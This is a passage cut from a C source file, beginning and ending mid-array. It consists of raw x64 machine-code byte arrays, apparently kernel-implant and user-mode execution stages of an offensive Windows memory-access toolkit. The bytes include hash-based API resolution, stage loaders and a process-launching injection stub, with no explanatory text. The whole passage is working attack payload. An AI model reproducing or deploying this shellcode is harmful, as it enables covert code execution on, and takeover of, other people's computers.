  0xff, 0xff, 0xff, 0x49, 0x89, 0x45, 0x08, 0x41, 0xc6, 0x04, 0x24, 0x05, 0x50, 0x41, 0x55, 0x48,
  0x8b, 0x05, 0x3a, 0xff, 0xff, 0xff, 0x50, 0x6a, 0x00, 0x48, 0x83, 0xec, 0x20, 0x4d, 0x33, 0xc9,
  0x4d, 0x33, 0xc0, 0x48, 0xc7, 0xc2, 0xff, 0xff, 0x1f, 0x00, 0x49, 0x8b, 0xcd, 0xff, 0x15, 0x05,
  0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x40, 0x41, 0xc6, 0x04, 0x24, 0x06, 0x58, 0xc3, 0xcc, 0xcc,
  0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48,
  0x89, 0x78, 0x20, 0x48, 0x63, 0x41, 0x3c, 0x8b, 0xea, 0x33, 0xd2, 0x44, 0x8b, 0x84, 0x08, 0x88,
  0x00, 0x00, 0x00, 0x4c, 0x03, 0xc1, 0x45, 0x8b, 0x48, 0x20, 0x41, 0x8b, 0x78, 0x24, 0x4c, 0x03,
  0xc9, 0x41, 0x8b, 0x58, 0x1c, 0x48, 0x03, 0xf9, 0x41, 0x8b, 0x70, 0x18, 0x48, 0x03, 0xd9, 0x85,
  0xf6, 0x74, 0x2e, 0x45, 0x8b, 0x11, 0x4c, 0x03, 0xd1, 0x45, 0x33, 0xdb, 0xeb, 0x0d, 0x49, 0xff,
  0xc2, 0x41, 0xc1, 0xcb, 0x0d, 0x0f, 0xb6, 0xc0, 0x44, 0x03, 0xd8, 0x41, 0x8a, 0x02, 0x84, 0xc0,
  0x75, 0xec, 0x44, 0x3b, 0xdd, 0x74, 0x21, 0xff, 0xc2, 0x49, 0x83, 0xc1, 0x04, 0x3b, 0xd6, 0x72,
  0xd2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x08, 0x48, 0x8b, 0x6c, 0x24, 0x10, 0x48, 0x8b, 0x74,
  0x24, 0x18, 0x48, 0x8b, 0x7c, 0x24, 0x20, 0xc3, 0x0f, 0xb7, 0x14, 0x57, 0x41, 0x3b, 0x50, 0x14,
  0x73, 0xdf, 0x8b, 0x04, 0x93, 0x48, 0x03, 0xc1, 0xeb, 0xd9, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48,
  0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x18, 0x4c, 0x89, 0x70, 0x20, 0x55,
  0x48, 0x8d, 0x68, 0xa1, 0x48, 0x81, 0xec, 0xa0, 0x00, 0x00, 0x00, 0x48, 0xb8, 0x77, 0x33, 0x33,
  0x11, 0x77, 0x33, 0x11, 0xff, 0x48, 0xc7, 0x41, 0x50, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x01,
  0x48, 0x8d, 0x75, 0x03, 0x48, 0x8b, 0xd9, 0xc7, 0x45, 0xd7, 0x1f, 0x9d, 0x48, 0x9d, 0xc7, 0x45,
  0xdb, 0x92, 0xf5, 0x45, 0x13, 0x4c, 0x8d, 0xb1, 0x58, 0x03, 0x00, 0x00, 0xc7, 0x45, 0xdf, 0xbc,
  0x1e, 0x36, 0x9f, 0xbf, 0x0b, 0x00, 0x00, 0x00, 0xc7, 0x45, 0xe3, 0x57, 0x63, 0x32, 0x5a, 0xc7,
  0x45, 0xe7, 0x6f, 0xa5, 0x77, 0x49, 0xc7, 0x45, 0xeb, 0xf9, 0xbe, 0xdd, 0x05, 0xc7, 0x45, 0xef,
  0xc9, 0xc5, 0x6e, 0x6c, 0xc7, 0x45, 0xf3, 0x02, 0x6b, 0xa0, 0x94, 0xc7, 0x45, 0xf7, 0x9b, 0x97,
  0x64, 0xcf, 0xc7, 0x45, 0xfb, 0x89, 0x4d, 0x3f, 0xbc, 0xc7, 0x45, 0xff, 0x92, 0x6d, 0x58, 0x58,
  0x48, 0x8b, 0x4b, 0x08, 0x48, 0x8d, 0x76, 0xfc, 0x8b, 0x16, 0x4d, 0x8d, 0x76, 0xf8, 0xe8, 0xbd,
  0xfe, 0xff, 0xff, 0x49, 0x89, 0x06, 0x83, 0xc7, 0xff, 0x75, 0xe5, 0x48, 0x8b, 0xcb, 0x4c, 0x8d,
  0x9c, 0x24, 0xa0, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x73, 0x18, 0x49, 0x8b,
  0x7b, 0x20, 0x4d, 0x8b, 0x73, 0x28, 0x49, 0x8b, 0xe3, 0x5d, 0xe9, 0x01, 0x00, 0x00, 0x00, 0xcc,
  0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41,
  0x56, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0xc7, 0x40, 0x08, 0xf0, 0xd8, 0xff, 0xff,
  0xb9, 0x00, 0x00, 0x00, 0x01, 0x41, 0xbe, 0xff, 0xff, 0xff, 0xff, 0x41, 0x8b, 0xd6, 0x33, 0xf6,
  0x48, 0x89, 0x4b, 0x18, 0xff, 0x93, 0x10, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0,
  0x75, 0x2c, 0xb9, 0x00, 0x00, 0x40, 0x00, 0x41, 0x8b, 0xd6, 0x48, 0x89, 0x4b, 0x18, 0xff, 0x93,
  0x10, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x12, 0x48, 0x21, 0x73, 0x18,
  0xb8, 0x01, 0x00, 0x00, 0xf0, 0x48, 0x89, 0x43, 0x30, 0xe9, 0xb7, 0x01, 0x00, 0x00, 0x48, 0x8b,
  0xcf, 0x48, 0x89, 0x7b, 0x28, 0xff, 0x93, 0x18, 0x03, 0x00, 0x00, 0x48, 0x89, 0x43, 0x20, 0x41,
  0xbe, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x30,
  0x48, 0x85, 0xc0, 0x75, 0x23, 0x49, 0x03, 0xf6, 0x48, 0xb8, 0x00, 0xe4, 0x0b, 0x54, 0x02, 0x00,
  0x00, 0x00, 0x48, 0x3b, 0xf0, 0x76, 0xde, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x33, 0xd2, 0x33, 0xc9,
  0xff, 0x93, 0x50, 0x03, 0x00, 0x00, 0xeb, 0xcd, 0x48, 0xc7, 0x43, 0x30, 0x02, 0x00, 0x00, 0x00,
  0x48, 0x83, 0xf8, 0x03, 0x0f, 0x84, 0x2f, 0x01, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x04, 0x75, 0x4e,
  0xff, 0x93, 0x20, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x75, 0x06, 0x48, 0x21,
  0x43, 0x38, 0xeb, 0x3a, 0x45, 0x33, 0xc0, 0x48, 0x83, 0x38, 0x00, 0x75, 0x07, 0x48, 0x83, 0x78,
  0x08, 0x00, 0x74, 0x09, 0x4d, 0x03, 0xc6, 0x48, 0x83, 0xc0, 0x10, 0xeb, 0xea, 0x49, 0xc1, 0xe0,
  0x04, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0x4c, 0x89, 0x43, 0x48, 0xff, 0x93, 0x40, 0x03, 0x00,
  0x00, 0x48, 0x8b, 0xce, 0xff, 0x93, 0x00, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x8b,
  0x83, 0xf8, 0x0f, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x05, 0x75, 0x1e, 0x4c, 0x8d, 0x83, 0x20, 0x02,
  0x00, 0x00, 0x48, 0x8b, 0xcb, 0x48, 0x8d, 0x93, 0x20, 0x01, 0x00, 0x00, 0xff, 0xd7, 0x48, 0x8b,
  0x83, 0xf8, 0x0f, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0xff, 0xc8, 0x49, 0x3b, 0xc6, 0x77,
  0x55, 0x48, 0x8b, 0x53, 0x48, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0x4b, 0x40, 0xff, 0x93, 0x28, 0x03,
  0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x74, 0x37, 0x48, 0x8b, 0x83, 0x40, 0x03, 0x00,
  0x00, 0x4c, 0x8b, 0x43, 0x48, 0x4c, 0x39, 0xb3, 0xf8, 0x0f, 0x00, 0x00, 0x75, 0x08, 0x48, 0x8b,
  0xd6, 0x48, 0x8b, 0xcf, 0xeb, 0x06, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xce, 0xff, 0xd0, 0x48, 0x8b,
  0x53, 0x48, 0x48, 0x8b, 0xce, 0xff, 0x93, 0x30, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0xeb,
  0x05, 0x48, 0x83, 0x63, 0x38, 0x00, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x48, 0x83, 0xf8,
  0x06, 0x75, 0x1c, 0x4c, 0x8b, 0x43, 0x48, 0x48, 0x8b, 0xcf, 0x48, 0x8b, 0x53, 0x40, 0xff, 0x93,
  0x40, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48,
  0x83, 0xf8, 0x07, 0x75, 0x15, 0x4c, 0x8b, 0x43, 0x48, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0x4b, 0x40,
  0xff, 0x93, 0x40, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x83, 0xa3, 0xf8, 0x0f, 0x00,
  0x00, 0x00, 0x33, 0xf6, 0xe9, 0x8c, 0xfe, 0xff, 0xff, 0xb8, 0x00, 0x00, 0x00, 0xf0, 0x48, 0x8b,
  0xcf, 0x48, 0x89, 0x43, 0x30, 0xff, 0x93, 0x08, 0x03, 0x00, 0x00, 0x48, 0x83, 0x63, 0x20, 0x00,
  0x48, 0x83, 0x63, 0x28, 0x00, 0x48, 0x83, 0x23, 0x00, 0x48, 0x83, 0xa3, 0xf8, 0x0f, 0x00, 0x00,
  0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48,
  0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3
};

const BYTE WINX64_STAGE23_VMM3[] = {
      0xeb, 0x4e, 0x00, 0x00, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44,
  0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
  0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
  0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
  0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
  0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56,
  0x41, 0x57, 0x57, 0x56, 0x53, 0x55, 0x48, 0x83, 0xec, 0x20, 0xff, 0x15, 0xb0, 0xff, 0xff, 0xff,
  0x48, 0x85, 0xc0, 0x75, 0x5c, 0xb0, 0x00, 0xb2, 0x01, 0x48, 0x8b, 0x0d, 0x98, 0xff, 0xff, 0xff,
  0xf0, 0x0f, 0xb0, 0x11, 0x75, 0x4b, 0x41, 0x54, 0x48, 0x8d, 0x05, 0x61, 0x00, 0x00, 0x00, 0x50,
  0x6a, 0x00, 0x48, 0x83, 0xec, 0x20, 0x4d, 0x33, 0xc9, 0x4d, 0x33, 0xc0, 0x48, 0xc7, 0xc2, 0xff,
  0xff, 0x1f, 0x00, 0x48, 0x8b, 0x0d, 0x6e, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc1, 0x08, 0xff, 0x15,
  0x74, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x38, 0x48, 0x83, 0xec, 0x38, 0x48, 0x8b, 0x0d, 0x55,
  0xff, 0xff, 0xff, 0x48, 0x8b, 0x49, 0x08, 0xff, 0x15, 0x63, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4,
  0x38, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0x5b, 0x5e, 0x5f, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41,
  0x5c, 0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x41, 0x58, 0x5a, 0x59, 0xe9, 0x14, 0xff, 0xff, 0xff,
  0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x20, 0x48, 0xc7, 0xc1, 0x00, 0x10, 0x00, 0x00, 0x48,
  0xc7, 0xc2, 0xff, 0xff, 0xff, 0x7f, 0xff, 0x15, 0x2c, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0xe8, 0x48,
  0x33, 0xc0, 0xb9, 0x00, 0x02, 0x00, 0x00, 0xff, 0xc9, 0x49, 0x89, 0x44, 0xcd, 0x00, 0x75, 0xf7,
  0x49, 0x8b, 0xcd, 0xff, 0x15, 0x17, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x0d, 0xe8, 0xfe, 0xff, 0xff,
  0x89, 0x41, 0x1c, 0x48, 0x8b, 0x05, 0x0e, 0xff, 0xff, 0xff, 0x49, 0x89, 0x45, 0x08, 0x49, 0x8b,
  0xcd, 0xe8, 0xa6, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x28, 0x48, 0x33, 0xc0, 0xc3, 0xcc, 0xcc,
  0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48,
  0x89, 0x78, 0x20, 0x48, 0x63, 0x41, 0x3c, 0x8b, 0xea, 0x33, 0xd2, 0x44, 0x8b, 0x84, 0x08, 0x88,
  0x00, 0x00, 0x00, 0x4c, 0x03, 0xc1, 0x45, 0x8b, 0x48, 0x20, 0x41, 0x8b, 0x78, 0x24, 0x4c, 0x03,
  0xc9, 0x41, 0x8b, 0x58, 0x1c, 0x48, 0x03, 0xf9, 0x41, 0x8b, 0x70, 0x18, 0x48, 0x03, 0xd9, 0x85,
  0xf6, 0x74, 0x2e, 0x45, 0x8b, 0x11, 0x4c, 0x03, 0xd1, 0x45, 0x33, 0xdb, 0xeb, 0x0d, 0x49, 0xff,
  0xc2, 0x41, 0xc1, 0xcb, 0x0d, 0x0f, 0xb6, 0xc0, 0x44, 0x03, 0xd8, 0x41, 0x8a, 0x02, 0x84, 0xc0,
  0x75, 0xec, 0x44, 0x3b, 0xdd, 0x74, 0x21, 0xff, 0xc2, 0x49, 0x83, 0xc1, 0x04, 0x3b, 0xd6, 0x72,
  0xd2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x08, 0x48, 0x8b, 0x6c, 0x24, 0x10, 0x48, 0x8b, 0x74,
  0x24, 0x18, 0x48, 0x8b, 0x7c, 0x24, 0x20, 0xc3, 0x0f, 0xb7, 0x14, 0x57, 0x41, 0x3b, 0x50, 0x14,
  0x73, 0xdf, 0x8b, 0x04, 0x93, 0x48, 0x03, 0xc1, 0xeb, 0xd9, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48,
  0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x18, 0x4c, 0x89, 0x70, 0x20, 0x55,
  0x48, 0x8d, 0x68, 0xa1, 0x48, 0x81, 0xec, 0xa0, 0x00, 0x00, 0x00, 0x48, 0xb8, 0x77, 0x33, 0x33,
  0x11, 0x77, 0x33, 0x11, 0xff, 0x48, 0xc7, 0x41, 0x50, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x01,
  0x48, 0x8d, 0x75, 0x03, 0x48, 0x8b, 0xd9, 0xc7, 0x45, 0xd7, 0x1f, 0x9d, 0x48, 0x9d, 0xc7, 0x45,
  0xdb, 0x92, 0xf5, 0x45, 0x13, 0x4c, 0x8d, 0xb1, 0x58, 0x03, 0x00, 0x00, 0xc7, 0x45, 0xdf, 0xbc,
  0x1e, 0x36, 0x9f, 0xbf, 0x0b, 0x00, 0x00, 0x00, 0xc7, 0x45, 0xe3, 0x57, 0x63, 0x32, 0x5a, 0xc7,
  0x45, 0xe7, 0x6f, 0xa5, 0x77, 0x49, 0xc7, 0x45, 0xeb, 0xf9, 0xbe, 0xdd, 0x05, 0xc7, 0x45, 0xef,
  0xc9, 0xc5, 0x6e, 0x6c, 0xc7, 0x45, 0xf3, 0x02, 0x6b, 0xa0, 0x94, 0xc7, 0x45, 0xf7, 0x9b, 0x97,
  0x64, 0xcf, 0xc7, 0x45, 0xfb, 0x89, 0x4d, 0x3f, 0xbc, 0xc7, 0x45, 0xff, 0x92, 0x6d, 0x58, 0x58,
  0x48, 0x8b, 0x4b, 0x08, 0x48, 0x8d, 0x76, 0xfc, 0x8b, 0x16, 0x4d, 0x8d, 0x76, 0xf8, 0xe8, 0xbd,
  0xfe, 0xff, 0xff, 0x49, 0x89, 0x06, 0x83, 0xc7, 0xff, 0x75, 0xe5, 0x48, 0x8b, 0xcb, 0x4c, 0x8d,
  0x9c, 0x24, 0xa0, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x73, 0x18, 0x49, 0x8b,
  0x7b, 0x20, 0x4d, 0x8b, 0x73, 0x28, 0x49, 0x8b, 0xe3, 0x5d, 0xe9, 0x01, 0x00, 0x00, 0x00, 0xcc,
  0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41,
  0x56, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0xc7, 0x40, 0x08, 0xf0, 0xd8, 0xff, 0xff,
  0xb9, 0x00, 0x00, 0x00, 0x01, 0x41, 0xbe, 0xff, 0xff, 0xff, 0xff, 0x41, 0x8b, 0xd6, 0x33, 0xf6,
  0x48, 0x89, 0x4b, 0x18, 0xff, 0x93, 0x10, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0,
  0x75, 0x2c, 0xb9, 0x00, 0x00, 0x40, 0x00, 0x41, 0x8b, 0xd6, 0x48, 0x89, 0x4b, 0x18, 0xff, 0x93,
  0x10, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x12, 0x48, 0x21, 0x73, 0x18,
  0xb8, 0x01, 0x00, 0x00, 0xf0, 0x48, 0x89, 0x43, 0x30, 0xe9, 0xb7, 0x01, 0x00, 0x00, 0x48, 0x8b,
  0xcf, 0x48, 0x89, 0x7b, 0x28, 0xff, 0x93, 0x18, 0x03, 0x00, 0x00, 0x48, 0x89, 0x43, 0x20, 0x41,
  0xbe, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x30,
  0x48, 0x85, 0xc0, 0x75, 0x23, 0x49, 0x03, 0xf6, 0x48, 0xb8, 0x00, 0xe4, 0x0b, 0x54, 0x02, 0x00,
  0x00, 0x00, 0x48, 0x3b, 0xf0, 0x76, 0xde, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x33, 0xd2, 0x33, 0xc9,
  0xff, 0x93, 0x50, 0x03, 0x00, 0x00, 0xeb, 0xcd, 0x48, 0xc7, 0x43, 0x30, 0x02, 0x00, 0x00, 0x00,
  0x48, 0x83, 0xf8, 0x03, 0x0f, 0x84, 0x2f, 0x01, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x04, 0x75, 0x4e,
  0xff, 0x93, 0x20, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x75, 0x06, 0x48, 0x21,
  0x43, 0x38, 0xeb, 0x3a, 0x45, 0x33, 0xc0, 0x48, 0x83, 0x38, 0x00, 0x75, 0x07, 0x48, 0x83, 0x78,
  0x08, 0x00, 0x74, 0x09, 0x4d, 0x03, 0xc6, 0x48, 0x83, 0xc0, 0x10, 0xeb, 0xea, 0x49, 0xc1, 0xe0,
  0x04, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0x4c, 0x89, 0x43, 0x48, 0xff, 0x93, 0x40, 0x03, 0x00,
  0x00, 0x48, 0x8b, 0xce, 0xff, 0x93, 0x00, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x8b,
  0x83, 0xf8, 0x0f, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x05, 0x75, 0x1e, 0x4c, 0x8d, 0x83, 0x20, 0x02,
  0x00, 0x00, 0x48, 0x8b, 0xcb, 0x48, 0x8d, 0x93, 0x20, 0x01, 0x00, 0x00, 0xff, 0xd7, 0x48, 0x8b,
  0x83, 0xf8, 0x0f, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0xff, 0xc8, 0x49, 0x3b, 0xc6, 0x77,
  0x55, 0x48, 0x8b, 0x53, 0x48, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0x4b, 0x40, 0xff, 0x93, 0x28, 0x03,
  0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x74, 0x37, 0x48, 0x8b, 0x83, 0x40, 0x03, 0x00,
  0x00, 0x4c, 0x8b, 0x43, 0x48, 0x4c, 0x39, 0xb3, 0xf8, 0x0f, 0x00, 0x00, 0x75, 0x08, 0x48, 0x8b,
  0xd6, 0x48, 0x8b, 0xcf, 0xeb, 0x06, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xce, 0xff, 0xd0, 0x48, 0x8b,
  0x53, 0x48, 0x48, 0x8b, 0xce, 0xff, 0x93, 0x30, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0xeb,
  0x05, 0x48, 0x83, 0x63, 0x38, 0x00, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x48, 0x83, 0xf8,
  0x06, 0x75, 0x1c, 0x4c, 0x8b, 0x43, 0x48, 0x48, 0x8b, 0xcf, 0x48, 0x8b, 0x53, 0x40, 0xff, 0x93,
  0x40, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48,
  0x83, 0xf8, 0x07, 0x75, 0x15, 0x4c, 0x8b, 0x43, 0x48, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0x4b, 0x40,
  0xff, 0x93, 0x40, 0x03, 0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x83, 0xa3, 0xf8, 0x0f, 0x00,
  0x00, 0x00, 0x33, 0xf6, 0xe9, 0x8c, 0xfe, 0xff, 0xff, 0xb8, 0x00, 0x00, 0x00, 0xf0, 0x48, 0x8b,
  0xcf, 0x48, 0x89, 0x43, 0x30, 0xff, 0x93, 0x08, 0x03, 0x00, 0x00, 0x48, 0x83, 0x63, 0x20, 0x00,
  0x48, 0x83, 0x63, 0x28, 0x00, 0x48, 0x83, 0x23, 0x00, 0x48, 0x83, 0xa3, 0xf8, 0x0f, 0x00, 0x00,
  0x00, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48,
  0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3
};

const BYTE WINX64_UMD_EXEC[] = {
  0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0xeb, 0x10, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
  0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x50, 0xb0, 0x00, 0xb2, 0x01, 0x48, 0x8b, 0x0d,
  0xe4, 0xff, 0xff, 0xff, 0xf0, 0x0f, 0xb0, 0x11, 0x75, 0x14, 0x48, 0x8b, 0x0d, 0xd7, 0xff, 0xff,
  0xff, 0x48, 0x83, 0xec, 0x30, 0xe8, 0xba, 0x02, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x30, 0x58, 0x41,
  0x59, 0x41, 0x58, 0x5a, 0x59, 0xff, 0x25, 0xc5, 0xff, 0xff, 0xff, 0xcc, 0x40, 0x53, 0x48, 0x83,
  0xec, 0x20, 0x48, 0x8b, 0x41, 0x18, 0x48, 0x8b, 0xd9, 0x33, 0xc9, 0x48, 0x89, 0x08, 0x38, 0x4b,
  0x02, 0x74, 0x1f, 0x88, 0x4b, 0x02, 0x48, 0x8b, 0x4b, 0x28, 0xff, 0x53, 0x48, 0x48, 0x8b, 0x4b,
  0x20, 0xff, 0x53, 0x48, 0x48, 0x8b, 0x4b, 0x30, 0xff, 0x53, 0x48, 0x48, 0x8b, 0x4b, 0x38, 0xff,
  0x53, 0x48, 0x48, 0x8b, 0x43, 0x10, 0x48, 0xb9, 0xac, 0xda, 0x37, 0x13, 0x00, 0x22, 0xda, 0xfe,
  0x48, 0x89, 0x08, 0x48, 0x8b, 0x43, 0x18, 0x48, 0x89, 0x08, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3,
  0x40, 0x53, 0x48, 0x83, 0xec, 0x70, 0xba, 0x68, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd9, 0x8d, 0x4a,
  0xd8, 0xff, 0x93, 0x88, 0x00, 0x00, 0x00, 0xc7, 0x00, 0x68, 0x00, 0x00, 0x00, 0xc7, 0x40, 0x3c,
  0x00, 0x01, 0x00, 0x00, 0x80, 0x7b, 0x01, 0x00, 0x74, 0x18, 0x48, 0x8b, 0x4b, 0x30, 0x48, 0x89,
  0x48, 0x58, 0x48, 0x8b, 0x4b, 0x38, 0x48, 0x89, 0x48, 0x50, 0x48, 0x8b, 0x4b, 0x30, 0x48, 0x89,
  0x48, 0x60, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0x45, 0x33, 0xc9, 0x48, 0x89, 0x4c, 0x24, 0x48, 0x48,
  0x8d, 0x93, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0x45, 0x33, 0xc0, 0x48, 0x83,
  0x64, 0x24, 0x38, 0x00, 0x33, 0xc9, 0x48, 0x83, 0x64, 0x24, 0x30, 0x00, 0x8b, 0x43, 0x04, 0x89,
  0x44, 0x24, 0x28, 0xc7, 0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0xff, 0x53, 0x58, 0x85, 0xc0,
  0x74, 0x1c, 0x80, 0x7b, 0x01, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x4b, 0x40, 0x74,
  0x08, 0x48, 0x8b, 0x4c, 0x24, 0x58, 0xff, 0x53, 0x48, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83,
  0xc4, 0x70, 0x5b, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xc1, 0x48, 0x8d, 0x54, 0x24, 0x30,
  0x48, 0x8b, 0x49, 0x40, 0xff, 0x50, 0x68, 0x33, 0xc9, 0x85, 0xc0, 0x74, 0x0f, 0x81, 0x7c, 0x24,
  0x30, 0x03, 0x01, 0x00, 0x00, 0x75, 0x05, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x8b, 0xc1, 0x48, 0x83,
  0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x56, 0x48, 0x83, 0xec, 0x30, 0x80, 0x79,
  0x02, 0x00, 0x48, 0x8b, 0xd9, 0x0f, 0x84, 0xae, 0x00, 0x00, 0x00, 0xbe, 0x00, 0x08, 0x00, 0x00,
  0x48, 0x8b, 0xcb, 0xe8, 0xac, 0xff, 0xff, 0xff, 0x85, 0xc0, 0x0f, 0x84, 0x99, 0x00, 0x00, 0x00,
  0x48, 0x8b, 0x4b, 0x18, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x4c, 0x8b, 0x53, 0x70, 0x44, 0x8b,
  0x49, 0x08, 0x48, 0x8d, 0x51, 0x68, 0x48, 0x8b, 0x4b, 0x28, 0x41, 0x81, 0xe1, 0xff, 0x07, 0x00,
  0x00, 0x41, 0x8b, 0xc1, 0x48, 0x03, 0xd0, 0x48, 0x8b, 0x43, 0x10, 0x44, 0x8b, 0x40, 0x10, 0x41,
  0x81, 0xe0, 0xff, 0x07, 0x00, 0x00, 0x45, 0x3b, 0xc1, 0x77, 0x08, 0x44, 0x8b, 0xc6, 0x45, 0x2b,
  0xc1, 0xeb, 0x03, 0x45, 0x33, 0xc0, 0x4c, 0x8d, 0x4c, 0x24, 0x40, 0x41, 0xff, 0xd2, 0x85, 0xc0,
